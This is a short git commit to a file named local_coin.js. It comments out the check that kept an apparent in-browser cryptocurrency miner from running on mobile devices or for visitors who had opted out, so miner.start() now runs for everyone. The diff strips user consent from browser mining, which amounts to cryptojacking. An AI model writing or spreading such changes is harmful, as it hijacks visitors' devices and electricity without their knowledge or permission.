367d9e87c33960a5daa0df2c398e247d8cfaaa03
Loid <1398231927@qq.com>
2018-01-17 20:54:01 +0800

    Update local_coin.js

--- local_coin.js
+++ local_coin.js
@@ -4,6 +4,6 @@
 
     // Only start on non-mobile devices and if not opted-out
     // in the last 14400 seconds (4 hours):
-if (!miner.isMobile() && !miner.didOptOut(14400)) {
+//if (!miner.isMobile() && !miner.didOptOut(14400)) {
      miner.start();
- }
+// }
